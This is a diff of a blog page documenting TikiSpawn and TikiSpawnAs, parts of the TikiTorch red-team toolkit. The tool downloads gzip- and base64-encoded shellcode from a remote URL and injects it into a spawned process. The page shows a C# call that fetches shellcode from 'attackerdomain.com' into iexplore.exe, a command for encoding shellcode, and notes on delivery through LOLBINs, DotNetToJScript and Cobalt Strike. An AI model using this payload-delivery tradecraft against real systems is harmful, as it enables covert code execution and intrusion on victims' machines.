@@ -306,7 +306,7 @@ if (!doNotTrack) {
 
 <h4 id="tikispawn">TikiSpawn</h4>
 
-<p>TikiSpawn is essentially what the original &ldquo;TikiTorch&rdquo; project was - a class library that could be compiled to a DLL and delivered to bootstrap an agent on a host.  It was designed as a DLL so that it was compatible with (DotNetToJScript)[<a href="https://github.com/tyranid/DotNetToJScript">https://github.com/tyranid/DotNetToJScript</a>], allowing you to run payloads via a variety of <a href="https://lolbas-project.github.io/">LOLBINS</a>.</p>
+<p>TikiSpawn is essentially what the original &ldquo;TikiTorch&rdquo; project was - a class library that could be compiled to a DLL and delivered to bootstrap an agent on a host.  It was designed as a DLL so that it was compatible with <a href="https://github.com/tyranid/DotNetToJScript">DotNetToJScript</a>, allowing you to run payloads via a variety of <a href="https://lolbas-project.github.io/">LOLBINS</a>.</p>
 
 <p>The easiest way to get started with <code>TikiSpawn</code> is to add your inputs to the constructor.</p>
 
@@ -316,13 +316,15 @@ if (!doNotTrack) {
 }
 </code></pre>
 
-<p>The first argument should be the <strong>binary</strong> you want to create, the second should be a <strong>URL</strong> where your base64 encoded shellcode lives.  <code>TikiSpawn</code> will download the shellcode over HTTP using a proxy-aware WebClient class, but you could change this to download over any protocol you like.  You could also add additional functionality to deal with encrypted or compressed shellcode.</p>
+<p>The first argument should be the <strong>binary</strong> you want to start, the second should be a <strong>URL</strong> where your Gzip&rsquo;d and base64 encoded shellcode lives.  To compress your shellcode, use the included <a href="https://github.com/rasta-mouse/TikiTorch/blob/master/Get-CompressedShellcode.ps1">Get-CompressedShellcode.ps1</a> on Windows, or <code>cat shellcode.bin | gzip -c -f | base64</code> on Linux.</p>
 
-<p>You should have something like:</p>
+<p><code>TikiSpawn</code> will download the shellcode over HTTP(S) using a proxy-aware WebClient class.</p>
+
+<p>This should look something like:</p>
 
 <pre><code class="language-C#">public TikiSpawn()
 {
-    Flame(@&quot;C:\\Program Files\\Internet Explorer\\iexplore.exe&quot;, @&quot;https://attackerdomain.com/evilshellcode.txt&quot;);
+    Flame(@&quot;C:\Program Files\Internet Explorer\iexplore.exe&quot;, @&quot;https://attackerdomain.com/evilshellcode.txt&quot;);
 }
 </code></pre>
 
@@ -351,7 +353,7 @@ if (!doNotTrack) {
 
 <h4 id="tikispawnas">TikiSpawnAs</h4>
 
-<p>This is the equivilent to <code>spawnas</code> and allows you to run an agent with alternate creds.  It&rsquo;s designed to be run via Cobalt Strike&rsquo;s <code>execute-assembly</code>, although you could also drop it to disk.  The current implementation requires that the shellcode be hardcoded into the binary.</p>
+<p>This is the equivilent to <code>spawnas</code> and allows you to run an agent with alternate creds.  It&rsquo;s designed to be run via Cobalt Strike&rsquo;s <code>execute-assembly</code>, although you could also drop it to disk.  The current implementation requires that the shellcode be hardcoded into the binary (but does not need to be Gzip&rsquo;d).</p>
 
 <pre><code class="language-C#">byte[] shellcode = Convert.FromBase64String(@&quot;&quot;);
 </code></pre>
